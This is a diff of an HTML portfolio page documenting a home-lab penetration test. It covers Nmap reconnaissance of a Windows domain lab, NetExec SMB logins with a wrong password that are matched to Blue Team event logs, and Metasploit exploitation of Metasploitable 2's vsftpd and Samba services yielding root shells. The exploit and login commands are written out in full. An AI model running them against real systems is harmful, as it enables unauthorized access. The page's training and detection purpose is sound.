@@ -1,310 +1,166 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>Offensive Security & Penetration Testing | Hanes Enterprise Labs</title>
-
     <link rel="stylesheet" href="../css/style.css">
 </head>
-
 <body>
+<header>
+    <nav class="navbar">
+        <a href="../index.html" class="logo">Hanes Enterprise Labs</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#home">Home</a></li>
+            <li><a href="../index.html#about">About</a></li>
+            <li><a href="../index.html#projects">Projects</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../resume.html">Resume</a></li>
+            <li><a href="../index.html#contact">Contact</a></li>
+        </ul>
+    </nav>
+</header>
 
-    <header>
-        <nav class="navbar">
+<main>
+<section class="project-hero">
+    <div class="section-container">
+        <a href="../index.html#projects" class="back-link">← Back to Projects</a>
+        <p class="section-label">OFFENSIVE SECURITY • PENETRATION TESTING</p>
+        <h1>Offensive Security &<br>Penetration Testing</h1>
+        <p class="project-hero-description">
+            A multi-stage offensive-security project combining reconnaissance and
+            service enumeration against a Windows enterprise lab with controlled
+            exploitation exercises against intentionally vulnerable systems. The
+            project documents attacker preparation, attack-surface analysis,
+            vulnerability validation, privilege verification, defensive detection,
+            and remediation-focused reporting.
+        </p>
+        <div class="project-tech">
+            <span>Kali Linux</span>
+            <span>Nmap</span>
+            <span>NetExec</span>
+            <span>SMBMap</span>
+            <span>Metasploit</span>
+            <span>Active Directory</span>
+            <span>Metasploitable 2</span>
+        </div>
+        <figure class="project-hero-image">
+            <img src="../images/offensive-security/kali-02-Reconnaissance-Toolkit-Installed.png"
+                 alt="Kali Linux reconnaissance toolkit showing Nmap NetExec and SMBMap availability">
+            <figcaption>
+                Kali Linux configured as the offensive-security workstation with
+                reconnaissance and enumeration tools prepared for enterprise
+                assessment and controlled exploitation.
+            </figcaption>
+        </figure>
+    </div>
+</section>
 
-            <a href="../index.html" class="logo">
-                Hanes Enterprise Labs
-            </a>
+<section class="project-detail-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">01 — OVERVIEW</p>
+            <h2>Project Overview</h2>
+        </div>
+        <div class="project-text">
+            <p>
+                This project documents a multi-stage offensive-security engagement
+                conducted entirely within a personally managed VirtualBox environment.
+            </p>
+            <p>
+                The primary engagement focuses on reconnaissance and attack-surface
+                analysis against the Windows enterprise environment I built, including
+                <strong>DC01</strong>, <strong>WS01</strong>, and
+                <strong>FS01</strong>. As the engagement progresses, testing will
+                expand into SMB, LDAP, Kerberos, credential, privilege-escalation,
+                and lateral-movement techniques.
+            </p>
+            <p>
+                A separate controlled-exploitation engagement preserves my earlier
+                work against <strong>Metasploitable 2</strong>. That training
+                environment was used to practice vulnerability validation, Metasploit
+                module configuration, remote-session handling, root-level access
+                verification, and professional findings documentation.
+            </p>
+            <p>
+                Offensive activity against the enterprise environment is also being
+                paired with the Blue Team lab so the same actions can be monitored,
+                investigated, and eventually interrupted from the defensive side.
+            </p>
+        </div>
+    </div>
+</section>
 
-            <ul class="nav-links">
-                <li><a href="../index.html#home">Home</a></li>
-                <li><a href="../index.html#about">About</a></li>
-                <li><a href="../index.html#projects">Projects</a></li>
-                <li><a href="../index.html#skills">Skills</a></li>
-                <li><a href="../resume.html">Resume</a></li>
-                <li><a href="../index.html#contact">Contact</a></li>
-            </ul>
-
-        </nav>
-    </header>
-
-
-    <main>
-
-        <section class="project-hero">
-
-            <div class="section-container">
-
-                <a href="../index.html#projects" class="back-link">
-                    ← Back to Projects
-                </a>
-
-                <p class="section-label">
-                    OFFENSIVE SECURITY • PENETRATION TESTING
-                </p>
-
-                <h1>
-                    Offensive Security &<br>
-                    Penetration Testing
-                </h1>
-
-                <p class="project-hero-description">
-                    Performed a structured penetration-testing workflow in an
-                    isolated virtual environment, progressing from attacker
-                    workstation preparation and reconnaissance through service
-                    enumeration, vulnerability validation, controlled exploitation,
-                    privilege verification, and remediation-focused reporting.
-                </p>
-
-                <div class="project-tech">
-                    <span>Kali Linux</span>
-                    <span>Nmap</span>
-                    <span>NetExec</span>
-                    <span>SMBMap</span>
-                    <span>Metasploit</span>
-                    <span>Metasploitable 2</span>
-                </div>
-
-                <figure class="project-hero-image">
-
-                    <img
-                        src="../images/offensive-security/kali-02-Reconnaissance-Toolkit-Installed.png"
-                        alt="Kali Linux reconnaissance toolkit showing Nmap NetExec and SMBMap availability"
-                    >
-
-                    <figcaption>
-                        Kali Linux configured as the offensive-security workstation
-                        with reconnaissance and enumeration tools prepared for
-                        controlled penetration testing.
-                    </figcaption>
-
-                </figure>
-
+<section class="project-detail-section alternate-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">02 — ENVIRONMENT</p>
+            <h2>Assessment Architecture</h2>
+        </div>
+        <div class="environment-grid">
+            <div class="environment-card">
+                <p class="card-label">ATTACKER</p>
+                <h3>Kali Linux</h3>
+                <p>Offensive workstation used for discovery, enumeration, exploitation, and validation.</p>
             </div>
-
-        </section>
-
-
-        <section class="project-detail-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">01 — OVERVIEW</p>
-                    <h2>Project Overview</h2>
-                </div>
-
-                <div class="project-text">
-
-                    <p>
-                        This project documents a controlled offensive-security
-                        assessment performed against intentionally vulnerable
-                        systems inside a personally managed VirtualBox environment.
-                    </p>
-
-                    <p>
-                        The engagement began with preparation of the Kali Linux
-                        attacker workstation, network validation, and reconnaissance
-                        tool verification. I then identified the target system,
-                        mapped its exposed services, researched potential weaknesses,
-                        and selected findings for validation.
-                    </p>
-
-                    <p>
-                        Controlled exploitation of vulnerable FTP and Samba services
-                        confirmed remote command execution and root-level access.
-                        Findings were documented with evidence, impact, severity, and
-                        practical mitigation recommendations rather than presenting
-                        scan output alone.
-                    </p>
-
-                </div>
-
+            <div class="environment-card">
+                <p class="card-label">ENTERPRISE TARGETS</p>
+                <h3>DC01 • WS01 • FS01</h3>
+                <p>Windows domain controller, workstation, and file server used for realistic enterprise testing.</p>
             </div>
-
-        </section>
-
-
-        <section class="project-detail-section alternate-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">02 — ENVIRONMENT</p>
-                    <h2>Lab Architecture</h2>
-                </div>
-
-                <div class="environment-grid">
-
-                    <div class="environment-card">
-                        <p class="card-label">ATTACKER</p>
-                        <h3>Kali Linux</h3>
-
-                        <p>
-                            Offensive-security workstation used for discovery,
-                            scanning, enumeration, exploitation, and validation.
-                        </p>
-                    </div>
-
-                    <div class="environment-card">
-                        <p class="card-label">TARGET</p>
-                        <h3>Metasploitable 2</h3>
-
-                        <p>
-                            Intentionally vulnerable Linux system used to practice
-                            structured vulnerability assessment and exploitation.
-                        </p>
-                    </div>
-
-                    <div class="environment-card">
-                        <p class="card-label">PLATFORM</p>
-                        <h3>VirtualBox</h3>
-
-                        <p>
-                            Isolated virtualization environment used to safely host
-                            the attacker and target systems.
-                        </p>
-                    </div>
-
-                </div>
-
+            <div class="environment-card">
+                <p class="card-label">TRAINING TARGET</p>
+                <h3>Metasploitable 2</h3>
+                <p>Intentionally vulnerable Linux system used for controlled exploitation practice.</p>
             </div>
-
-        </section>
-
-
-        <section class="project-detail-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">03 — METHODOLOGY</p>
-                    <h2>Penetration-Testing Process</h2>
-                </div>
-
-                <div class="methodology-list">
-
-                    <div class="methodology-item">
-                        <span class="method-number">01</span>
-                        <div>
-                            <h3>Attacker Preparation</h3>
-                            <p>
-                                Configured Kali Linux, validated network connectivity,
-                                and confirmed the required reconnaissance tools.
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="methodology-item">
-                        <span class="method-number">02</span>
-                        <div>
-                            <h3>Discovery & Scanning</h3>
-                            <p>
-                                Identified the target and mapped the exposed TCP
-                                services with Nmap.
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="methodology-item">
-                        <span class="method-number">03</span>
-                        <div>
-                            <h3>Service Enumeration</h3>
-                            <p>
-                                Collected service versions, operating-system context,
-                                and detailed attack-surface information.
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="methodology-item">
-                        <span class="method-number">04</span>
-                        <div>
-                            <h3>Vulnerability Validation</h3>
-                            <p>
-                                Selected candidate weaknesses based on evidence and
-                                validated them through controlled testing.
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="methodology-item">
-                        <span class="method-number">05</span>
-                        <div>
-                            <h3>Exploitation & Access Verification</h3>
-                            <p>
-                                Established remote sessions and confirmed the
-                                resulting privilege level and command execution.
-                            </p>
-                        </div>
-                    </div>
-
-                    <div class="methodology-item">
-                        <span class="method-number">06</span>
-                        <div>
-                            <h3>Risk Analysis & Reporting</h3>
-                            <p>
-                                Documented technical evidence, impact, severity, and
-                                mitigation recommendations for each finding.
-                            </p>
-                        </div>
-                    </div>
-
-                </div>
-
+            <div class="environment-card">
+                <p class="card-label">DEFENSIVE VALIDATION</p>
+                <h3>Blue Team Monitoring</h3>
+                <p>Centralized logging and detection environment used to observe and investigate offensive activity.</p>
             </div>
+        </div>
+    </div>
+</section>
 
-        </section>
+<section class="project-detail-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">03 — METHODOLOGY</p>
+            <h2>Engagement Methodology</h2>
+        </div>
+        <div class="methodology-list">
+            <div class="methodology-item"><span class="method-number">01</span><div><h3>Attacker Preparation</h3><p>Configure Kali Linux, validate network access, and verify the offensive toolset.</p></div></div>
+            <div class="methodology-item"><span class="method-number">02</span><div><h3>Enterprise Reconnaissance</h3><p>Discover live systems, identify infrastructure roles, and establish scope.</p></div></div>
+            <div class="methodology-item"><span class="method-number">03</span><div><h3>Host & Service Enumeration</h3><p>Profile DC01, WS01, and FS01 to map exposed services and potential attack paths.</p></div></div>
+            <div class="methodology-item"><span class="method-number">04</span><div><h3>Active Directory Assessment</h3><p>Expand into SMB, LDAP, Kerberos, credential, privilege-escalation, and lateral-movement testing.</p></div></div>
+            <div class="methodology-item"><span class="method-number">05</span><div><h3>Defensive Detection Validation</h3><p>Correlate attacker actions with Blue Team telemetry, detections, and response.</p></div></div>
+            <div class="methodology-item"><span class="method-number">06</span><div><h3>Controlled Exploitation Training</h3><p>Use intentionally vulnerable systems to practice exploitation, session handling, and reporting.</p></div></div>
+        </div>
+    </div>
+</section>
 
+<section class="project-detail-section alternate-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">04 — ENGAGEMENT ONE</p>
+            <h2>Enterprise Penetration Test</h2>
+        </div>
+        <div class="project-text">
+            <p>
+                The enterprise engagement is the primary and actively expanding
+                portion of this project. It follows the attack path from initial
+                Kali preparation and host discovery through service enumeration and
+                future Active Directory testing.
+            </p>
 
-        <section class="project-detail-section alternate-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">04 — EVIDENCE</p>
-                    <h2>Technical Walkthrough</h2>
-                </div>
-
-                <div class="project-text">
-
-
-                    <!-- STEP 01 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 01</p>
-
-                            <h3>Attacker Environment Preparation</h3>
-
-                            <p>
-                                Before beginning reconnaissance, I configured the
-                                Kali Linux workstation on the isolated assessment
-                                network and verified communication with the lab
-                                environment.
-                            </p>
-
-                            <p>
-                                Kali was assigned the address
-                                <strong>192.168.10.50/24</strong>, and connectivity
-                                to the Windows lab network was validated with a
-                                successful ICMP test to DC01.
-                            </p>
-
-                            <p>
-                                I then confirmed that the reconnaissance and
-                                enumeration toolkit was available, including Nmap,
-                                NetExec, and SMBMap. This established a repeatable
-                                baseline before conducting offensive testing.
-                            </p>
-
-                            <p class="command-label">Preparation Workflow</p>
-
-                            <pre class="command-block"><code>Kali Linux
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">ENTERPRISE STEP 01</p>
+                    <h3>Attacker Environment Preparation</h3>
+                    <p>Kali was configured on the isolated enterprise network and assigned <strong>192.168.10.50/24</strong>.</p>
+                    <p>Connectivity to DC01 was validated, then Nmap, NetExec, and SMBMap were confirmed before testing.</p>
+                    <p class="command-label">Preparation Workflow</p>
+                    <pre class="command-block"><code>Kali Linux
         │
         ▼
 Network Configuration
@@ -317,913 +173,433 @@ Reconnaissance Tool Verification
         │
         ▼
 Assessment Platform Ready</code></pre>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/offensive-security/Kali-01-BAseline-Network-Connectivity.png"
-                                alt="Kali Linux baseline network configuration and successful connectivity validation"
-                            >
-
-                            <p class="evidence-caption">
-                                The attacker workstation was configured
-                                on the isolated network and successfully validated
-                                connectivity before reconnaissance.
-                            </p>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/offensive-security/kali-02-Reconnaissance-Toolkit-Installed.png"
-                                alt="Kali Linux reconnaissance toolkit verification"
-                            >
-
-                            <p class="evidence-caption">
-                                Nmap, NetExec, and SMBMap were verified
-                                on the attacker workstation before the assessment.
-                            </p>
-
-                        </div>
-
-                    </div>
-
-
-                    <!-- STEP 02 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 02</p>
-
-                            <h3>Network Discovery</h3>
-
-                            <p>
-                                I verified connectivity between Kali Linux and the
-                                Metasploitable 2 target at
-                                <strong>192.168.56.101</strong>.
-                            </p>
-
-                            <p>
-                                After confirming the target was reachable, I ran an
-                                initial Nmap scan to identify exposed services and
-                                establish the available attack surface.
-                            </p>
-
-                            <p class="command-label">Command</p>
-
-                            <pre class="command-block"><code>nmap 192.168.56.101</code></pre>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/Nmap metasploit.png"
-                                alt="Initial Nmap scan against Metasploitable 2"
-                            >
-
-                            <p class="evidence-caption">
-                                Initial Nmap reconnaissance identified the target's
-                                exposed TCP services.
-                            </p>
-
-                        </div>
-
-                    </div>
-
-
-                    <!-- STEP 03 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 03</p>
-
-                            <h3>Service & Version Enumeration</h3>
-
-                            <p>
-                                I performed service and version detection to collect
-                                additional information about the software running on
-                                the target.
-                            </p>
-
-                            <p>
-                                The scan identified numerous legacy and exposed
-                                services, including FTP, SSH, Telnet, Samba, MySQL,
-                                PostgreSQL, VNC, and web services.
-                            </p>
-
-                            <p>
-                                FTP on TCP port 21 was identified as
-                                <strong>vsftpd 2.3.4</strong>, making it a candidate
-                                for focused vulnerability research and validation.
-                            </p>
-
-                            <p class="command-label">Command</p>
-
-                            <pre class="command-block"><code>nmap -sV 192.168.56.101 -oN service_scan.txt</code></pre>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/nmap service scan.png"
-                                alt="Nmap service and version enumeration of Metasploitable 2"
-                            >
-
-                            <p class="evidence-caption">
-                                Service-version detection identified legacy software
-                                and potential attack paths for further investigation.
-                            </p>
-
-                        </div>
-
-                    </div>
-
-
-                    <!-- STEP 04 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 04</p>
-
-                            <h3>Detailed Enumeration</h3>
-
-                            <p>
-                                I performed a more detailed Nmap scan to gather
-                                operating-system context, service configuration
-                                details, and additional information about exposed
-                                applications.
-                            </p>
-
-                            <p>
-                                The results confirmed an older Linux environment with
-                                numerous remotely accessible services. This evidence
-                                helped prioritize services for validation rather than
-                                treating every open port as a confirmed vulnerability.
-                            </p>
-
-                            <p class="command-label">Command</p>
-
-                            <pre class="command-block"><code>nmap -A 192.168.56.101 -oN detailed_scan.txt</code></pre>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/nmap detailed scan-1.png"
-                                alt="Detailed Nmap enumeration scan of Metasploitable 2"
-                            >
-
-                            <p class="evidence-caption">
-                                Detailed enumeration provided operating-system and
-                                application context used to prioritize testing.
-                            </p>
-
-                        </div>
-
-                    </div>
-
-
-                    <!-- STEP 05 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 05</p>
-
-                            <h3>VSFTPD Vulnerability Validation</h3>
-
-                            <p>
-                                Based on the enumeration evidence, I selected the
-                                FTP service running vsftpd 2.3.4 for controlled
-                                validation with Metasploit.
-                            </p>
-
-                            <p>
-                                I configured the VSFTPD backdoor module with the
-                                target and listener addresses, then reviewed the
-                                options before execution.
-                            </p>
-
-                            <p class="command-label">Metasploit Module</p>
-
-                            <pre class="command-block"><code>use exploit/unix/ftp/vsftpd_234_backdoor
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/offensive-security/Kali-01-BAseline-Network-Connectivity.png"
+                         alt="Kali Linux baseline network configuration and connectivity validation">
+                    <p class="evidence-caption">Network configuration and connectivity were validated before reconnaissance.</p>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/offensive-security/kali-02-Reconnaissance-Toolkit-Installed.png"
+                         alt="Kali Linux reconnaissance toolkit verification">
+                    <p class="evidence-caption">Nmap, NetExec, and SMBMap were verified before the assessment.</p>
+                </div>
+            </div>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">ENTERPRISE STEP 02</p>
+                    <h3>Enterprise Network Reconnaissance</h3>
+                    <p>An Nmap ping scan across <strong>192.168.10.0/24</strong> identified the core enterprise assets.</p>
+                    <p><strong>DC01</strong> was identified at 192.168.10.10, <strong>WS01</strong> at 192.168.10.20, and <strong>FS01</strong> at 192.168.10.30.</p>
+                    <p>Follow-up enumeration of DC01 exposed DNS, Kerberos, LDAP, SMB, RPC, and related Active Directory services.</p>
+                    <p class="command-label">Commands</p>
+                    <pre class="command-block"><code>nmap -sn 192.168.10.0/24
+
+nmap -Pn -sV -sC 192.168.10.10</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/offensive-security/Kali-03-Enterprise-Network-Reconnaissance.png"
+                         alt="Kali Linux host discovery and domain controller service enumeration">
+                    <p class="evidence-caption">Host discovery identified DC01, WS01, and FS01, followed by service enumeration of DC01.</p>
+                </div>
+            </div>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">ENTERPRISE STEP 03</p>
+                    <h3>File Server Service Enumeration</h3>
+                    <p>Targeted enumeration against <strong>FS01</strong> identified Windows RPC, SMB, and HTTP-based services.</p>
+                    <p>SMB fingerprinting provided host and protocol details relevant to future share, authentication, and signing analysis.</p>
+                    <p class="command-label">Command</p>
+                    <pre class="command-block"><code>nmap -Pn -sV -sC 192.168.10.30</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/offensive-security/Kali-04-File-Server-Service-Enumeration.png"
+                         alt="Kali Linux file server service enumeration against FS01">
+                    <p class="evidence-caption">FS01 enumeration identified RPC, SMB, HTTP-related services, and SMB configuration details.</p>
+                </div>
+            </div>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">ENTERPRISE STEP 04</p>
+                    <h3>Workstation Service Enumeration</h3>
+                    <p>Enumeration of <strong>WS01</strong> identified Windows RPC, SMB, and HTTP-based services.</p>
+                    <p>The results established a baseline for future endpoint, credential, and lateral-movement testing.</p>
+                    <p class="command-label">Command</p>
+                    <pre class="command-block"><code>nmap -Pn -sV -sC 192.168.10.20</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/offensive-security/Kali-05-Workstation-Service-Enumeration.png"
+                         alt="Kali Linux workstation service enumeration against WS01">
+                    <p class="evidence-caption">WS01 enumeration identified Windows services and workstation fingerprinting information.</p>
+                </div>
+            </div>
+            <!-- ENTERPRISE STEP 05 -->
+<div class="evidence-item">
+
+    <div class="evidence-text">
+
+        <p class="section-label">ENTERPRISE STEP 05</p>
+
+        <h3>SMB Authentication Testing</h3>
+
+        <p>
+            After identifying the enterprise hosts and profiling their exposed
+            services, I performed controlled SMB authentication testing using
+            NetExec to evaluate authentication behavior across the Windows
+            environment.
+        </p>
+
+        <p>
+            Rather than attempting exploitation, this phase focused on
+            validating authentication responses using intentionally invalid
+            credentials. This approach provides valuable reconnaissance by
+            confirming domain membership, SMB configuration, account handling,
+            and security controls while remaining within an authorized testing
+            scope.
+        </p>
+
+        <p>
+            Authentication attempts were performed against the domain controller
+            (DC01), workstation (WS01), and file server (FS01). DC01 and FS01
+            returned <strong>STATUS_LOGON_FAILURE</strong>, confirming the
+            supplied credentials were rejected. The assessment also identified
+            SMB signing configuration differences between systems, an important
+            observation for future Active Directory attack-path analysis.
+        </p>
+
+        <div class="project-note">
+
+    <p class="section-label">BLUE TEAM CORRELATION</p>
+
+    <p>
+        The failed SMB authentication attempts documented in this step generated
+        Windows Security Event ID 4625. These events were centrally collected
+        through Windows Event Forwarding and investigated within the
+        <strong>Blue Team Operations & Detection Engineering</strong> project.
+    </p>
+
+</div>
+
+        <p class="command-label">Command</p>
+
+<pre class="command-block"><code>netexec smb 192.168.10.10 -u ecarter -p WrongPassword123!
+
+netexec smb 192.168.10.20 -u ecarter -p WrongPassword123!
+
+netexec smb 192.168.10.30 -u ecarter -p WrongPassword123!</code></pre>
+
+    </div>
+
+
+    <div class="evidence-image">
+
+        <img
+            src="../images/offensive-security/Kali-16-Failed-Authentication-Attack.png"
+            alt="NetExec SMB authentication testing against the enterprise environment"
+        >
+
+        <p class="evidence-caption">
+            Controlled SMB authentication testing against DC01,
+            WS01, and FS01 validated authentication responses, identified SMB
+            signing behavior, and generated Windows Security Event ID 4625 for
+            Blue Team investigation.
+        </p>
+
+    </div>
+
+</div>
+        </div>
+    </div>
+</section>
+
+<section class="project-detail-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">05 — ROADMAP</p>
+            <h2>Enterprise Assessment Roadmap</h2>
+        </div>
+        <div class="project-text">
+            <p>The enterprise penetration test is still in active development. Future evidence will be added as each stage is completed and validated.</p>
+            <div class="outcomes-grid">
+                <div class="outcome-card"><p class="card-label">NEXT PHASE</p><h3>SMB Enumeration</h3><p>Enumerate shares, permissions, signing behavior, and authentication exposure.</p></div>
+                <div class="outcome-card"><p class="card-label">PLANNED</p><h3>LDAP & Directory Enumeration</h3><p>Gather domain, user, group, computer, and directory information.</p></div>
+                <div class="outcome-card"><p class="card-label">PLANNED</p><h3>Kerberos Assessment</h3><p>Evaluate Kerberos-related exposure and potential ticket-based attack paths.</p></div>
+                <div class="outcome-card"><p class="card-label">PLANNED</p><h3>Credential Testing</h3><p>Conduct controlled authentication and credential validation.</p></div>
+                <div class="outcome-card"><p class="card-label">PLANNED</p><h3>Privilege Escalation & Lateral Movement</h3><p>Validate access-expansion paths after initial compromise.</p></div>
+                <div class="outcome-card"><p class="card-label">PLANNED</p><h3>Detection & Response Validation</h3><p>Compare attacker actions with Blue Team telemetry, detections, and response.</p></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="project-detail-section alternate-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">06 — ENGAGEMENT TWO</p>
+            <h2>Controlled Exploitation Validation</h2>
+        </div>
+        <div class="project-text">
+            <p>
+                Before expanding into the enterprise assessment, I used
+                Metasploitable 2 as a controlled training target to practice
+                exploitation methodology, remote-session handling, privilege
+                verification, and remediation-focused reporting.
+            </p>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">TRAINING STEP 01</p>
+                    <h3>Target Discovery & Initial Scanning</h3>
+                    <p>I verified connectivity to <strong>192.168.56.101</strong> and ran an initial Nmap scan.</p>
+                    <p class="command-label">Command</p>
+                    <pre class="command-block"><code>nmap 192.168.56.101</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/Nmap metasploit.png" alt="Initial Nmap scan against Metasploitable 2">
+                    <p class="evidence-caption">Initial reconnaissance identified exposed TCP services on the training target.</p>
+                </div>
+            </div>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">TRAINING STEP 02</p>
+                    <h3>Service & Version Enumeration</h3>
+                    <p>Service detection identified numerous legacy services, including FTP, SSH, Telnet, Samba, databases, VNC, and web services.</p>
+                    <p>FTP on TCP port 21 was identified as <strong>vsftpd 2.3.4</strong>.</p>
+                    <p class="command-label">Command</p>
+                    <pre class="command-block"><code>nmap -sV 192.168.56.101 -oN service_scan.txt</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/nmap service scan.png" alt="Nmap service and version enumeration of Metasploitable 2">
+                    <p class="evidence-caption">Service-version detection identified legacy software and candidate attack paths.</p>
+                </div>
+            </div>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">TRAINING STEP 03</p>
+                    <h3>Detailed Enumeration</h3>
+                    <p>A detailed scan collected operating-system context and additional application information.</p>
+                    <p class="command-label">Command</p>
+                    <pre class="command-block"><code>nmap -A 192.168.56.101 -oN detailed_scan.txt</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/nmap detailed scan-1.png" alt="Detailed Nmap enumeration scan of Metasploitable 2">
+                    <p class="evidence-caption">Detailed enumeration provided context used to prioritize controlled testing.</p>
+                </div>
+            </div>
+
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">TRAINING STEP 04</p>
+                    <h3>VSFTPD Vulnerability Validation</h3>
+                    <p>I configured the Metasploit VSFTPD 2.3.4 backdoor module and reviewed the target and listener settings before execution.</p>
+                    <p class="command-label">Metasploit Module</p>
+                    <pre class="command-block"><code>use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.101
 set LHOST 192.168.56.102
 show options</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/VSFTPD-2.png" alt="Metasploit VSFTPD 2.3.4 module configuration">
+                    <p class="evidence-caption">The VSFTPD module was configured and reviewed before controlled execution.</p>
+                </div>
+            </div>
 
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/VSFTPD-2.png"
-                                alt="Metasploit VSFTPD 2.3.4 backdoor module configuration"
-                            >
-
-                            <p class="evidence-caption">
-                                The VSFTPD module was configured and reviewed before
-                                controlled execution.
-                            </p>
-
-                        </div>
-
-                    </div>
-
-
-                    <!-- STEP 06 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 06</p>
-
-                            <h3>Successful Exploitation & Privilege Validation</h3>
-
-                            <p>
-                                Executing the VSFTPD module successfully triggered the
-                                vulnerable service and established a remote session.
-                            </p>
-
-                            <p>
-                                I opened a shell and used
-                                <strong>whoami</strong> to verify the privilege level.
-                                The command returned <strong>root</strong>, confirming
-                                administrative-level access.
-                            </p>
-
-                            <p>
-                                Listing the root filesystem further validated
-                                interactive command execution and control of the
-                                target host.
-                            </p>
-
-                            <p class="command-label">Validation</p>
-
-                            <pre class="command-block"><code>run
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">TRAINING STEP 05</p>
+                    <h3>Successful Exploitation & Privilege Validation</h3>
+                    <p>The VSFTPD module established a remote session, and shell validation returned <strong>root</strong>.</p>
+                    <p class="command-label">Validation</p>
+                    <pre class="command-block"><code>run
 shell
 whoami
 ls</code></pre>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/VSFTPD-3.png" alt="Successful VSFTPD exploitation and remote session">
+                    <p class="evidence-caption">The VSFTPD exploit established an interactive remote session.</p>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/VSFTPD- 4.png" alt="Root privilege validation after VSFTPD exploitation">
+                    <p class="evidence-caption">Shell validation confirmed root-level command execution.</p>
+                </div>
+            </div>
 
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/VSFTPD-3.png"
-                                alt="Successful VSFTPD exploitation and established session"
-                            >
-
-                            <p class="evidence-caption">
-                                The VSFTPD exploit established an interactive remote
-                                session against the target.
-                            </p>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/VSFTPD- 4.png"
-                                alt="Root privilege validation after VSFTPD exploitation"
-                            >
-
-                            <p class="evidence-caption">
-                                Shell validation confirmed root-level command
-                                execution on Metasploitable 2.
-                            </p>
-
-                        </div>
-
-                    </div>
-
-
-                    <!-- STEP 07 -->
-                    <div class="evidence-item">
-
-                        <div class="evidence-text">
-
-                            <p class="section-label">STEP 07</p>
-
-                            <h3>Samba Remote Command Execution Validation</h3>
-
-                            <p>
-                                I continued reviewing the attack surface and selected
-                                the exposed Samba service for additional testing.
-                            </p>
-
-                            <p>
-                                The Metasploit
-                                <strong>user_map_script</strong> module successfully
-                                established a remote command shell on the target.
-                            </p>
-
-                            <p>
-                                Running <strong>whoami</strong> returned
-                                <strong>root</strong>, confirming privileged remote
-                                command execution through a second independent
-                                attack path.
-                            </p>
-
-                            <p class="command-label">Metasploit Module</p>
-
-                            <pre class="command-block"><code>use exploit/multi/samba/usermap_script
+            <div class="evidence-item">
+                <div class="evidence-text">
+                    <p class="section-label">TRAINING STEP 06</p>
+                    <h3>Samba Remote Command Execution Validation</h3>
+                    <p>The Metasploit <strong>user_map_script</strong> module established a remote shell, and <strong>whoami</strong> returned <strong>root</strong>.</p>
+                    <p class="command-label">Metasploit Module</p>
+                    <pre class="command-block"><code>use exploit/multi/samba/usermap_script
 set RHOSTS 192.168.56.101
 set LHOST 192.168.56.102
 run
 whoami</code></pre>
-
-                        </div>
-
-
